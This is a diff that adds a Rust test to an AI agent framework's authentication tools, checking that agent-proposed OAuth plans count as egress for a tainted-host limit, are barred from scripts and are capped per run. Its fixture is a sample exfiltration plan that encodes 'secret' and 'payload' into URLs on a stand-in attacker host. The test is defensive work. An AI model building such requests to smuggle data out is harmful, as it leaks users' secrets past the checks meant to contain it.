@@ -398,3 +398,68 @@ async fn nobody_there_skips_and_researched_lookalikes_are_refused() {
         swapped.content
     );
 }
+
+/// Security fix 1: a researched plan is an outbound request to a host the
+/// agent chose (with whatever it encodes in the host and path), so it is
+/// egress for the tainted host limit, never reachable from a script, and
+/// capped per run.
+#[tokio::test]
+async fn researched_plans_are_egress_and_capped() {
+    use tern_core::tool::Effect;
+    let s = idp().await;
+    let e = env(&s);
+    let u = user(Some("oauth"));
+    let propose = AuthPropose {
+        host: e.host.clone(),
+        asker: u.clone(),
+    };
+    let exfil = json!({"plan": {
+        "service": "Acme",
+        "issuer": "https://c2VjcmV0.attacker.invalid/cGF5bG9hZA",
+        "authorize_url": "https://c2VjcmV0.attacker.invalid/authorize",
+        "token_url": "https://c2VjcmV0.attacker.invalid/token",
+        "api_hosts": ["api.attacker.invalid"]
+    }});
+    // The host the metadata fetch goes to is what the taint check sees.
+    assert_eq!(
+        propose.egress_host(&exfil).as_deref(),
+        Some("c2vjcmv0.attacker.invalid")
+    );
+    let mut no_issuer = exfil.clone();
+    no_issuer["plan"].as_object_mut().unwrap().remove("issuer");
+    assert_eq!(
+        propose.egress_host(&no_issuer).as_deref(),
+        Some("c2vjcmv0.attacker.invalid")
+    );
+    // A kept plan fetches nothing.
+    assert_eq!(propose.egress_host(&json!({"plan_id": "plan_x"})), None);
+
+    for tool in ["auth_discover", "auth_propose", "connection_add"] {
+        assert!(
+            !tern_core::script::callable_in_scripts(tool, Effect::Read),
+            "{tool} is offered to scripts"
+        );
+    }
+
+    // A run can't loop it: past the cap, nothing is fetched or shown.
+    let c = ctx();
+    for _ in 0..tern_auth::tools::MAX_PROPOSALS_PER_RUN {
+        let out = propose.call(&c, json!({"plan_id": "plan_gone"})).await;
+        assert!(out.content.contains("no plan"), "{}", out.content);
+    }
+    let out = propose.call(&c, exfil.clone()).await;
+    assert!(
+        out.is_error && out.content.contains("proposed enough"),
+        "{}",
+        out.content
+    );
+    assert!(u.cards.lock().unwrap().is_empty());
+    // Another run has its own allowance.
+    let other = ToolCtx {
+        run_id: "r2".into(),
+        ..ctx()
+    };
+    let id = e.host.plans.keep(plan(&s));
+    let v = parse(&propose.call(&other, json!({"plan_id": id})).await);
+    assert_eq!(v["choice"], "oauth");
+}
